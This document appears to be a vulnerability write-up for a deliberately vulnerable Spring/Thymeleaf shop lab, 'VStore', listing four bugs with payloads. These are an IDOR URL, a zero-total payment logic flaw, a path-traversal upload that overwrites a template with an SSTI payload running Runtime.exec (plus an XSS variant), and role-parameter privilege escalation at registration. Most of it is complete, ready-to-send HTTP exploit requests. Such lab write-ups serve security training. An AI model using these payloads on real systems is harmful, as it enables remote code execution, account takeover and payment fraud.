# Store

### 1. GET "/profile/{username}"
- Bug: IDOR
- Param: {username}
- Payload:
    ```http://localhost/profile/admin```
    
### 2. POST "/pay"
- Bug: Logic
- Params: total
- Payload: 
    ```total=0```

### 3. POST "/profile/update/{username}"
- Bug: Bypassing file restrictions leads to arbitrary file uploads
- Param: Image
- Payload: Replace malicious content to 403.html file
  + RCE:
```
POST /profile/update/phitb HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------8600530112356002242560640947
Content-Length: 925
Origin: http://localhost
Connection: close
Referer: http://localhost/profile/phitb
Cookie: JSESSIONID=618748751DFEAB00DB0638F5E976EFD8
Upgrade-Insecure-Requests: 1

-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="name"

Tráº§n Báº£o Phi
-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="phone"

123 456 789
-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="about"

User account
-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="file"; filename="/../../../../../../templates/403.html"
Content-Type: image/png

<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>VStore</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<h1>Access Denied</h1>
<p th:text="${T(java.lang.Runtime).getRuntime().exec('calc')}"/>
</body>
</html>
-----------------------------8600530112356002242560640947--
```
  + XSS:
```
POST /profile/update/phitb HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------8600530112356002242560640947
Content-Length: 925
Origin: http://localhost
Connection: close
Referer: http://localhost/profile/phitb
Cookie: JSESSIONID=618748751DFEAB00DB0638F5E976EFD8
Upgrade-Insecure-Requests: 1

-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="name"

Tráº§n Báº£o Phi
-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="phone"

123 456 789
-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="about"

User account
-----------------------------8600530112356002242560640947
Content-Disposition: form-data; name="file"; filename="/../../../../../../templates/403.html"
Content-Type: image/png

<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>VStore</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<h1>Access Denied</h1>
<script>alert(document.domain)</script>
</body>
</html>
-----------------------------8600530112356002242560640947--
```

### 4. POST "/register"
- Bug: Privilege Escalation
- Param: role
- Payload:
```
POST /register HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://localhost
Connection: close
Referer: http://localhost/login?logout
Cookie: JSESSIONID=ED218F7FCE02EDE9204B00BF9302EA9B
Upgrade-Insecure-Requests: 1

name=Admin+Phi&username=phi_admin&password=phi_admin&role=Privilege_Escalation_To_Admin
```
